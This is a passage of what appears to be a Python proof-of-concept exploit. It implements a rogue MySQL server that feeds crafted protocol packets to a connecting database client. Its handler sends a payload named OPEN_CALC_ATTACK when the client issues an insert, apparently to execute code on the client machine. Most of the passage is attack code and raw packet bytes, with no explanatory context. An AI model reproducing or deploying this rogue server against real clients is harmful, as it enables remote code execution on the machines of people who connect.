fd\x00\x00\x00\x00\x00\x61\x00\x00\x07\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x02\x63\x75\x10\x4b\x45\x59\x5f\x43\x4f\x4c\x55\x4d\x4e\x5f\x55\x53\x41\x47\x45\x11\x72\x65\x66\x65\x72\x65\x6e\x63\x65\x64\x5f\x63\x6f\x6c\x75\x6d\x6e\x16\x52\x45\x46\x45\x52\x45\x4e\x43\x45\x44\x5f\x43\x4f\x4c\x55\x4d\x4e\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x00\x00\x00\x00\x00\x55\x00\x00\x08\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x02\x72\x63\x17\x52\x45\x46\x45\x52\x45\x4e\x54\x49\x41\x4c\x5f\x43\x4f\x4e\x53\x54\x52\x41\x49\x4e\x54\x53\x09\x6f\x6e\x5f\x75\x70\x64\x61\x74\x65\x0b\x55\x50\x44\x41\x54\x45\x5f\x52\x55\x4c\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x55\x00\x00\x09\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x02\x72\x63\x17\x52\x45\x46\x45\x52\x45\x4e\x54\x49\x41\x4c\x5f\x43\x4f\x4e\x53\x54\x52\x41\x49\x4e\x54\x53\x09\x6f\x6e\x5f\x64\x65\x6c\x65\x74\x65\x0b\x44\x45\x4c\x45\x54\x45\x5f\x52\x55\x4c\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x0a\xfe\x00\x00\x22\x00\x05\x00\x00\x0b\xfe\x00\x00\x22\x00")
            elif(b"SELECT * " in data):
                if(b"LIMIT 100" in data and b"OFFSET 0" in data):
                    IS_TABLE_SELECTED = True
                    print("[+] SELECT * FROM `poc_table` order by `id` asc LIMIT 100 OFFSET 0")
                    sendBuff(clientSocket,b"\x01\x00\x00\x01\x02\x2f\x00\x00\x02\x03\x64\x65\x66\x03\x70\x6f\x63\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x02\x69\x64\x02\x69\x64\x0c\x3f\x00\x0a\x00\x00\x00\x03\x23\x42\x00\x00\x00\x3f\x00\x00\x03\x03\x64\x65\x66\x03\x70\x6f\x63\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x0a\x63\x72\x65\x61\x74\x65\x64\x5f\x61\x74\x0a\x63\x72\x65\x61\x74\x65\x64\x5f\x61\x74\x0c\x3f\x00\x13\x00\x00\x00\x07\x81\x04\x00\x00\x00\x05\x00\x00\x04\xfe\x00\x00\x02\x00\x05\x00\x00\x05\xfe\x00\x00\x02\x00")
            # phase new
            elif(b"START TRANSACTION" in data):
                print("[+] START TRANSACTION")
                sendBuff(clientSocket,TRANSACTION)
                INSERTABLE = True
            elif(b"insert" in data):
                print("[+] ATTACK!!!")
                sendBuff(clientSocket,OPEN_CALC_ATTACK)
            elif(b"ROLLBACK" in data):
                print("[+] ROLL BACK!!")
                sendBuff(clientSocket,ROLLBACK)
            elif(b"SELECT connection_id()" in data):
                print("[+] SELECT connection_id() from pid")
                sendBuff(clientSocket,PID)
            else:
                if(IS_DB_SELECTED):
                    print("OK_AFTER_DB")
                    sendBuff(clientSocket,OK_AFTER_DB)
                else:
                    print("OK")
                    sendBuff(clientSocket,OK)
            data = readBuff(clientSocket)